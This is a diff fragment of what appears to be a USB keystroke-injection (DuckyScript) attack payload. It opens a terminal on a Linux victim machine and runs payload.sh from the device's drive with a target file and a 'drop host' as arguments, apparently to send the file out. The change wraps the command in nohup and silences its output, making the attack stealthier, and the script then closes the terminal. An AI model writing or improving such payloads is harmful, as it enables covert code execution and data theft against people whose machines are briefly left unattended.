@@ -37,7 +37,7 @@ END_IF
 
 CTRL-ALT t
 DELAY 2000
-STRINGLN  "${BASH}" /media/${USER}/#RD_LABEL/payload.sh #TARGET_FILE #DROP_HOST &
+STRINGLN  nohup "${BASH}" /media/"${USER}"/#RD_LABEL/payload.sh #TARGET_FILE #DROP_HOST &> /dev/null
 DELAY 1500
 STRINGLN exit
 
